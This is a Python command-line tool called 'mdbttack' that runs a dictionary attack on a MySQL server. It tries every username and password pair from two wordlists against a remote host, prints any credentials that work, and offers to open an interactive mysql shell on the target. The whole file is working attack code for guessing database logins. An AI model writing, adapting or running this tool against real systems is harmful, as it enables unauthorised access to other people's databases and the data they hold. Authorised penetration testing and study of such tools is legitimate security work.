# Copyright (C) 2022, Nathalon

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

from sys import argv
from time import strftime
from getopt import getopt, GetoptError
from rlcompleter import readline
from colorama import Fore, Back, Style
from MySQLdb import connect, OperationalError
from pexpect import spawn
from itertools import product


def banner():

    print("-----------------------------------------------------------------------")
    print(Fore.GREEN + "                                                          ")
    print(Fore.GREEN + "              .______.    __    __                 __     ")
    print(Fore.GREEN + "   _____    __| _/\_ |___/  |__/  |______    ____ |  | __ ")
    print(Fore.GREEN + "  /     \  / __ |  | __ \   __\   __\__  \ _/ ___\|  |/ / ")
    print(Fore.GREEN + " |  Y Y  \/ /_/ |  | \_\ \  |  |  |  / __ \\  \___|    <  ")
    print(Fore.GREEN + " |__|_|  /\____ |  |___  /__|  |__| (____  /\___  >__|_ \ ")
    print(Fore.GREEN + "       \/      \/      \/                \/     \/     \/ ")
    print(Fore.WHITE)
    print("-----------------------------------------------------------------------")
    print(Style.RESET_ALL)


def version():

    print(Fore.YELLOW + "+-------------------------------------------------------------------------------+")
    print(Fore.YELLOW + "| mdbttack | Copyright (C) 2022 Nathalon                                        |")
    print(Fore.YELLOW + "|                                                                               |")
    print(Fore.YELLOW + "| This program comes with ABSOLUTELY NO WARRANTY; for details type `show w`.    |")
    print(Fore.YELLOW + "| This is free software, and you are welcome to redistribute it                 |")
    print(Fore.YELLOW + "| under certain conditions; type `show c` for details.                          |")
    print(Fore.YELLOW + "+-------------------------------------------------------------------------------+")


def usage():

    print("Example: python3 mdbttack.py --remote-host 127.0.0.1 --userlist userlist --passlist passlist")

    print("\nOptions:")

    print("  -V: --version                        Print version information and exit")
    print("  -h: --help                           Print usage and exit")
    print("  -r: --remote-host                    Enter remote host")
    print("  -u: --userlist                       Input from list of usernames")
    print("  -p: --passlist                       Input from list of passwords")


def mdbttack():

    print("------------------------------------------------------------------------")
    print(Fore.YELLOW + "[i]" + Style.RESET_ALL + " Starting at: ({0})".format(strftime("%c")))
    print("------------------------------------------------------------------------")

    try:
        user = open(userlist)
        passwd = open(passlist)

    except (IOError) as e:
        print(Fore.RED + "[!] " + Style.RESET_ALL + "{0}".format(e))

    else:
        for line in product(user, passwd):
            username = line[0].strip()
            password = line[1].strip()

            try:
                db = connect(remote_host, user=username, passwd=password)

            except (OperationalError):
                print(Fore.RED + "[!] " + Style.RESET_ALL + "Username: ({0}) Password: ({1}) Invalid".format(username, password))

            else:
                print(Fore.GREEN + "\n[+]" + Style.RESET_ALL + " Dictionary attack was successful:")
                print(Fore.GREEN + "    [+]" + Style.RESET_ALL + " Username: " + Fore.YELLOW + "({0})".format(username))
                print(Fore.GREEN + "    [+]" + Style.RESET_ALL + " Password: " + Fore.YELLOW + "({0}) \n".format(password))

                while True:
                    try:
                        spawn_shell = input(Fore.YELLOW + "[*]" + Style.RESET_ALL + " Spawn shell(yes/no); ")

                        if (spawn_shell == "yes") or (spawn_shell == "y"):
                            id = spawn("mysql", ["-u", username, "-p", "-h", remote_host])
                            id.expect_exact("Enter password:")
                            id.sendline(password)
                            id.interact()

                            return

                        elif (spawn_shell == "no") or (spawn_shell == "n"):
                            print(Fore.RED + "\n[*]" + Style.RESET_ALL + " Exiting ..")

                            print("------------------------------------------------------------------------")
                            print(Fore.YELLOW + "[i] " + Style.RESET_ALL + "Finished at: ({0})".format(strftime("%c")))
                            print("------------------------------------------------------------------------")

                            return

                    except (KeyboardInterrupt, SystemExit):
                        pass


def main():

    global remote_host
    global userlist
    global passlist

    try:
        opts, args = getopt(argv[1:], "hVr:u:p:", ["help", "version", "remote-host=", "userlist=", "passlist="])

    except GetoptError:
        usage()

    else:
        try:
            for opt, arg in opts:
                if opt in ("-V", "--version"): version(); exit(1)
                if opt in ("-h", "--help"): usage(); exit(1)
                if opt in ("-r", "--remote-host"): remote_host = arg
                if opt in ("-u", "--userlist"): userlist = arg
                if opt in ("-p", "--passlist"): passlist = arg

            if opts:
                mdbttack()

            else:
                usage()

        except (UnboundLocalError):
            pass

        except (TypeError):
            pass

        except (NameError):
            usage()


banner()

if __name__ == '__main__':
        main()
